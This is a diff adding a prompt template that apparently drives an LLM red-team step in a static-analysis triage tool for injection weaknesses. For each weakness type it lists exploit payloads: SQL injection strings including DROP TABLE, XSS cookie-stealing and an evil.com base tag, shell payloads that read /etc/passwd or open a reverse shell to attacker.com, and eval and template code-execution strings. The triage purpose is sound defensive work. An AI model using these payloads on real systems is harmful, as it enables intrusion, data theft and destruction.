@@ -1,0 +1,142 @@
+{#
+  Attacker (Red Team) prompt template for injection vulnerabilities.
+  Covers: CWE-78 (OS Command Injection), CWE-79 (XSS),
+          CWE-89 (SQL Injection), CWE-94 (Code Injection),
+          CWE-95 (Eval Injection)
+
+  Variables:
+    code_slice, taint_path, cwe_id, cwe_name, sast_message,
+    sast_confidence, location, graph_context, rag_context, language
+#}
+You are an expert offensive security researcher specializing in injection vulnerabilities.
+
+Analyze the following code for a potential **{{ cwe_id }} ({{ cwe_name }})** vulnerability.
+
+## Injection Type Classification
+
+{% if cwe_id == "CWE-89" %}
+**Category: SQL Injection**
+The sink accepts structured SQL. Determine whether attacker-controlled input reaches a SQL query without parameterization.
+
+Known exploit payloads for SQL Injection:
+- Authentication bypass: `' OR '1'='1' --`, `' OR 1=1 --`, `admin'--`
+- UNION-based extraction: `' UNION SELECT username, password FROM users --`
+- Blind boolean: `' AND 1=1 --` vs `' AND 1=2 --`
+- Time-based blind: `'; WAITFOR DELAY '0:0:5' --` (MSSQL), `' AND SLEEP(5) --` (MySQL), `'; SELECT pg_sleep(5) --` (PostgreSQL)
+- Stacked queries: `'; DROP TABLE users; --`
+- Second-order injection: stored payload executed in a different query context
+{% elif cwe_id == "CWE-79" %}
+**Category: Cross-Site Scripting (XSS)**
+The sink renders output in an HTML context. Determine whether attacker-controlled input reaches the DOM without encoding.
+
+Known exploit payloads for XSS:
+- Reflected: `<script>alert(document.cookie)</script>`
+- Attribute context: `" onmouseover="alert(1)` , `' onfocus='alert(1)' autofocus='`
+- HTML context: `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`
+- JavaScript context: `';alert(1)//`, `\x3cscript\x3ealert(1)\x3c/script\x3e`
+- Template literal: `${alert(1)}`
+- DOM-based: `document.location.hash` sinks
+- CSP bypass payloads: `<base href="https://evil.com">`, `<script nonce>` reuse
+{% elif cwe_id == "CWE-78" %}
+**Category: OS Command Injection**
+The sink passes input to a system shell. Determine whether attacker-controlled input reaches an OS command execution function.
+
+Known exploit payloads for OS Command Injection:
+- Command chaining: `; cat /etc/passwd`, `| whoami`, `&& id`
+- Subshell: `` `whoami` ``, `$(id)`
+- Pipe: `| nc attacker.com 4444 -e /bin/sh`
+- Argument injection: `--output=/etc/cron.d/backdoor`
+- Newline injection: `%0aid`
+- Null byte truncation (legacy): `file.txt%00.jpg`
+- Windows: `& net user`, `| dir`, `%COMSPEC% /c whoami`
+{% elif cwe_id == "CWE-94" %}
+**Category: Code Injection**
+The sink evaluates or executes code dynamically. Determine whether attacker-controlled input reaches eval/exec or equivalent.
+
+Known exploit payloads for Code Injection:
+- Python eval: `__import__('os').system('id')`, `().__class__.__bases__[0].__subclasses__()`
+- Python exec: `import os; os.popen('id').read()`
+- JavaScript eval: `require('child_process').execSync('id')`
+- PHP: `system('id');`, `<?php passthru('id'); ?>`
+- Sandbox escape: prototype pollution, frame-busting, AST injection
+{% elif cwe_id == "CWE-95" %}
+**Category: Eval Injection (Dynamic Code Evaluation)**
+The sink evaluates expressions in an interpreter context. Determine whether attacker-controlled input reaches an expression evaluator.
+
+Known exploit payloads for Eval Injection:
+- Python: `__import__('subprocess').check_output(['id'])`
+- JavaScript: `constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')`
+- Template engines: `{{ "{{" }} config.__class__.__init__.__globals__['os'].popen('id').read() {{ "}}" }}`
+- Expression languages: `${T(java.lang.Runtime).getRuntime().exec('id')}`
+{% endif %}
+
+## Code Under Analysis
+```{{ language }}
+{{ code_slice }}
+```
+
+## Identified Taint Path
+{{ taint_path }}
+
+## SAST Finding
+- Rule: {{ cwe_id }}
+- Message: {{ sast_message }}
+- Location: {{ location }}
+- SAST Confidence: {{ sast_confidence }}
+{% if graph_context %}
+
+## Graph Analysis Results
+{{ graph_context }}
+{% endif %}
+{% if rag_context %}
+
+## Reference Knowledge
+{{ rag_context }}
+{% endif %}
+
+## Your Task (Attacker Perspective)
+
+Perform a thorough exploitation analysis:
+
+1. **Payload Construction**: Can you construct a payload that bypasses any input validation present in the code? Provide the exact payload string.
+
+2. **Encoding/Escaping Analysis**: What encoding or escaping transformations would the payload need to survive to reach the sink? Consider:
+   - Character encoding (UTF-8, URL encoding, HTML entities, Base64)
+   - Framework-level transformations (ORM escaping, template auto-escaping)
+   - Application-level filters (regex, allowlists, denylists)
+
+3. **Injection Context Assessment**: Is the injection context ({{ cwe_name }}) exploitable in this specific framework and language ({{ language }})? Consider:
+{% if cwe_id == "CWE-89" %}
+   - Does the ORM/database driver support parameterized queries that are bypassed here?
+   - Is it a raw SQL query vs ORM query builder?
+   - What database engine is targeted (affects payload syntax)?
+{% elif cwe_id == "CWE-79" %}
+   - Is the output in HTML body, attribute, JavaScript, CSS, or URL context?
+   - Does the template engine auto-escape by default?
+   - Are there CSP headers that would block inline scripts?
+{% elif cwe_id == "CWE-78" %}
+   - Is `shell=True` used in subprocess calls?
+   - Is the command constructed via string concatenation or argument lists?
+   - What OS is targeted (affects command syntax)?
+{% elif cwe_id in ("CWE-94", "CWE-95") %}
+   - Is eval/exec called with restricted globals/builtins?
+   - Is there an AST-based safety check before evaluation?
+   - Can sandbox restrictions be bypassed?
+{% endif %}
+
+4. **Exploitation Assumptions**: List every assumption that must hold for exploitation to succeed (e.g., "no WAF in front of the application", "user input reaches this endpoint without authentication", "database user has DROP privileges").
+
+5. **Counterexamples**: What conditions would invalidate this finding? What defensive measures, if present elsewhere in the codebase, would prevent exploitation?
+
+Respond with this exact JSON structure:
+{
+    "exploitable": true or false,
+    "payload": "concrete exploit payload string or null",
+    "execution_trace": ["step 1: input enters at ...", "step 2: passes through ...", "step 3: reaches sink at ..."],
+    "blocking_factors": ["factor that prevents exploitation 1", "factor 2"],
+    "confidence": 0.0 to 1.0,
+    "confidence_justification": "why this confidence level -- cite specific code evidence",
+    "assumptions": ["assumption 1 that must hold", "assumption 2"],
+    "counterexamples": ["condition that would invalidate this finding 1", "condition 2"],
+    "reasoning": "detailed explanation of exploitation analysis"
+}
